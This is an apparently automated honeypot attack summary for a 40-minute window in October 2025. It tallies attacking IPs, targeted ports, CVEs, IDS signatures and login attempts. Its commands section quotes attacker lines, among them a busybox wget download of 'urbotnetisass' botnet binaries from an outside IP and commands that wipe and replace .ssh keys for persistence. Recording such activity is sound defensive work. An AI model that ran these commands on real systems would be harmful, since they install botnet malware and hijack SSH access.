# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T04:01:24Z
**Timeframe:** 2025-10-01T03:20:01Z to 2025-10-01T04:00:02Z
**Files Used:**
- agg_log_20251001T032001Z.json
- agg_log_20251001T034001Z.json
- agg_log_20251001T040002Z.json

## Executive Summary
This report summarizes 7,463 attacks recorded by the honeypot network. The majority of attacks were captured by the Honeytrap, Suricata, and Ciscoasa honeypots. A significant portion of the attacks originated from the IP address 92.242.166.161, primarily targeting port 25 (SMTP). A recurring command involving the download and execution of `urbotnetisass` malware was observed across multiple attacks.

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 2109
- Suricata: 1492
- Ciscoasa: 1416
- Cowrie: 1083
- Mailoney: 825
- Dionaea: 356
- Tanner: 49
- H0neytr4p: 38
- ConPot: 14
- Sentrypeer: 13
- ElasticPot: 13
- Redishoneypot: 19
- Honeyaml: 17
- Adbhoney: 10
- Ipphoney: 4
- Heralding: 3
- ssh-rsa: 2

### Top Attacking IPs
- 92.242.166.161: 822
- 185.156.73.166: 363
- 185.156.73.167: 362
- 92.63.197.55: 350
- 92.63.197.59: 332
- 94.41.18.235: 264
- 161.97.98.142: 187
- 45.130.190.34: 164
- 88.214.50.58: 161
- 107.173.85.161: 124

### Top Targeted Ports/Protocols
- 25: 820
- 445: 308
- 22: 172
- 8333: 96
- 80: 57
- 443: 38
- 8020: 35
- TCP/1521: 22
- 8081: 20
- 6379: 19

### Most Common CVEs
- CVE-2024-3721 CVE-2024-3721: 2
- CVE-2019-11500 CVE-2019-11500: 2
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 2
- CVE-2002-0013 CVE-2002-0012: 2
- CVE-2005-4050: 1
- CVE-2016-20016 CVE-2016-20016: 1
- CVE-1999-0183: 1

### Commands Attempted by Attackers
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ... : 3
- uname -a: 4
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 3
- lockr -ia .ssh: 3
- cd ~ && rm -rf .ssh && mkdir .ssh && echo ...: 3
- cat /proc/cpuinfo | grep name | wc -l: 3
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 3
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 3
- ls -lh $(which ls): 3
- crontab -l: 3
- w: 3
- uname -m: 3
- top: 3
- whoami: 3
- lscpu | grep Model: 3
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 3
- Enter new UNIX password: : 2

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1: 387
- 2402000: 387
- ET SCAN NMAP -sS window 1024: 211
- 2009582: 211
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 119
- 2023753: 119
- ET INFO Reserved Internal IP Traffic: 58
- 2002752: 58
- ET HUNTING RDP Authentication Bypass Attempt: 40
- 2034857: 40

### Users / Login Attempts
- 345gs5662d34/345gs5662d34: 3
- root/abc123456..: 2
- admin/: 2
- foundry/foundry: 2
- root/Aa112211.: 2
- root/nPSpP4PBW0: 2
- observer/observer123: 1
- admin/zkpk: 1
- admin/omura: 1

### Files Uploaded/Downloaded
- arm.urbotnetisass: 3
- arm5.urbotnetisass: 3
- arm6.urbotnetisass: 3
- arm7.urbotnetisass: 3
- x86_32.urbotnetisass: 3
- mips.urbotnetisass: 3
- mipsel.urbotnetisass: 3
- ?format=json: 2
- azenv.php: 1

### HTTP User-Agents
- No user agents were logged.

### SSH Clients
- No SSH clients were logged.

### SSH Servers
- No SSH servers were logged.

### Top Attacker AS Organizations
- No AS organizations were logged.

## Key Observations and Anomalies
- The high number of attacks on port 25 (SMTP) from a single IP (92.242.166.161) suggests a targeted campaign, likely for spam or phishing.
- The repeated use of the `urbotnetisass` malware download command indicates a coordinated botnet activity.
- A variety of CVEs were targeted, but with low frequency, suggesting opportunistic scanning rather than a focused exploit campaign.
- The commands attempted by attackers show a clear pattern of reconnaissance and attempts to establish persistence.
